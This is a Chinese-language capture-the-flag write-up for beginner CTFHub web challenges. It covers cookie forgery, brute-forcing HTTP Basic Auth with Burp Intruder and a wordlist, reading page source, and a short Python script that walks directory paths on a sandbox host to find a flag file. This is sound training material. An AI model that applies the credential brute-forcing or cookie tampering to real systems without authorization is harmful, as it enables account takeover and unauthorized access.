<h5 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a><strong>302跳转</strong></h5><p><img src="https://s2.loli.net/2025/01/06/ceMrzoPnvVkODiI.png"><br><img src="https://s2.loli.net/2025/01/06/SXAm3CLFU7qfhJd.png"><br> 点击Give me Flag后发生跳转<br><img src="https://s2.loli.net/2025/01/06/dVWft2hr5EYlPZg.png"><br> F12-&gt;Network<br><img src="https://s2.loli.net/2025/01/06/NXheyLSiCrKOVYE.png"><br> 点击进去之后可以看到有一个链接，下意识点击抓包<br><img src="https://s2.loli.net/2025/01/06/aF5yeSgrY7f1cim.png"><br> 成功拿到flag</p>
<h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><strong>Cookie</strong></h5><p><img src="https://s2.loli.net/2025/01/06/RJmU937GoqrpYQl.png"><br><img src="https://s2.loli.net/2025/01/06/slHREaF2BPzA4Zg.png"><br>这是道cookie题，又说要admin才能得到flag，应该是要伪造cookie，抓包<br><img src="https://s2.loli.net/2025/01/06/ZGWak5ocOVspX3r.png"><br>一开始我以为admin后面要写用户名或者密码啥的，然后就爆破，一直爆不出来 ，然后把0改成1，就可以出来flag<br><img src="https://s2.loli.net/2025/01/06/Yev8IGXhZSOrByz.png"><br>我在网上查时，cookie的一行应该为一条数据。也就是说这条数据的 “名字” 叫做admin，其 值 为0，改成就可以出来，但我用2，又不行了。</p>
<h5 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a><strong>基础认证</strong></h5><p><img src="https://s2.loli.net/2025/01/16/aW5OZzuvrKhn9mx.png"><br><img src="https://s2.loli.net/2025/01/16/fYT8pqvmja2BAsx.png"><br>题目附件下载下来是个字典<br><img src="https://s2.loli.net/2025/01/16/txqzJFX6CiTQjIr.png"><br>点击Click，需要输入用户名和密码<br><img src="https://s2.loli.net/2025/01/16/hcjZBGQ7k5NVOmi.png"><br>尝试输入admin，admin，没有反应。使用burp suite抓包 。在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。在进行基本认证的过程里，请求的HTTP头字段会包含Authorization字段，形式如下： Authorization: Basic &lt;凭证&gt;，该凭证是用户和密码的组和的base64编码。<br><img src="https://s2.loli.net/2025/01/16/VRnjciu4FevpdBw.png"><br>抓包得到的凭证为YWRtaW46YWRtaW4&#x3D;（base64编码）将凭证解码后，显示的就是刚刚输入的用户名和密码<br><img src="https://s2.loli.net/2025/01/16/E8hQRMakPw9FuiK.png"><br>猜测可能需要使用附件提供的字典进行爆破。右键，send to intruder<br><img src="https://s2.loli.net/2025/01/16/dqo8ym5fce1HOQ4.png"><br>点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img src="https://s2.loli.net/2025/01/16/ib7eYslhHq8Z5MR.png"><br>加载附件中的字典<br><img src="https://s2.loli.net/2025/01/16/W8Sxzvl7GnHAjPq.png"><br>添加admin：（将用户名定义成admin并添加分隔符）<br><img src="https://s2.loli.net/2025/01/16/VLwH84RY5EWJupr.png"><br>添加base64编码<br><img src="https://s2.loli.net/2025/01/16/Nbp27HeSwsBCufr.png"><br>取消url编码的勾选，不然&#x3D;会被转换成%3d<br><img src="https://s2.loli.net/2025/01/16/qCfL2tRHIk7X35v.png"><br>开始爆破<br><img src="https://s2.loli.net/2025/01/16/saGEoRUhtKXSJbN.png"><br>爆破完成之后，点击Length,发现一个长度不一样的，点击查看response，拿到flag<br><img src="https://s2.loli.net/2025/01/16/nLWD9I6OPTdboU8.png"></p>
<h5 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a><strong>响应包源代码</strong></h5><p><img src="https://s2.loli.net/2025/01/16/37v5jAigLpaMlTO.png"><br>靶机环境：打开是个贪吃蛇的游戏<br><img src="https://s2.loli.net/2025/01/16/3IzY4VmLHbP95Oh.png"><br>根据提示，右键，检查源码，发现flag就在源码中<br><img src="https://s2.loli.net/2025/01/16/CyoP2vsxKmWlqRe.png"></p>
<h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a><strong>信息泄露</strong></h4><h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><strong>目录遍历</strong></h5><p><img src="https://s2.loli.net/2025/01/16/EmOx3GSZ295fH1U.png"><br>目录遍历，实际上就是让新手熟悉信息资源目录，手动找就能找到。真·有手就行。快速拿到flag 开启环境后看到有按钮，直接点进去进入目录。<br><img src="https://s2.loli.net/2025/01/16/JxnXR8SuMk4jvlT.png"><br><img src="https://s2.loli.net/2025/01/16/HUKGm9asNVELRc8.png"><br>简单的遍历目录一个个找下去就能找到，每次开启不同的环境，flag也会不同。【避免投机取巧】<br><img src="https://s2.loli.net/2025/01/16/aGYVdXCwe67UMxW.png"><br>扩展_使用代码 如果文件太多手动无法找到怎么办，此时就需要写代码拿到flag了。仔细观察url，每点入一个目录，就会有&#x2F;1&#x2F; 、&#x2F;2&#x2F; 一共四个目录，有规律，可以通过字符串拼接的方式拿到。此处使用requests库（requests是使用Apache2 licensed 许可证的HTTP库）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_ coding:utf-8 _*_</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge-86f520eadd52975a.sandbox.ctfhub.com:10800/flag_in_here/&quot;</span><br><span class="line"></span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        # URL字符串拼接</span><br><span class="line">        url_test =url+&quot;/&quot;+str(i)+&quot;/&quot;+str(j)</span><br><span class="line">        # 获取页面响应内容</span><br><span class="line">        r = requests.get(url_test)</span><br><span class="line">        # 设置编码方式</span><br><span class="line">        r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">        # 查找是否存在 flag.txt</span><br><span class="line">        get_file=r.text</span><br><span class="line">        if &quot;flag.txt&quot; in get_file:</span><br><span class="line">            print(url_test)</span><br><span class="line"></span><br><span class="line"># 此程序只适用于flag.txt文件形式存在的flag</span><br></pre></td></tr></table></figure>
<p>运行python代码，即可得到flag.txt存储路径的url。<br><img src="https://s2.loli.net/2025/01/16/JvTshlDALzmKaBw.png"><br><img src="https://s2.loli.net/2025/01/16/Fa7zTItL1KNUDOC.png"></p>
]]></content>
      <categories>
        <category>网络靶场</category>
      </categories>
      <tags>
        <tag>靶场通关秘籍</tag>
      </tags>
  </entry>
</search>
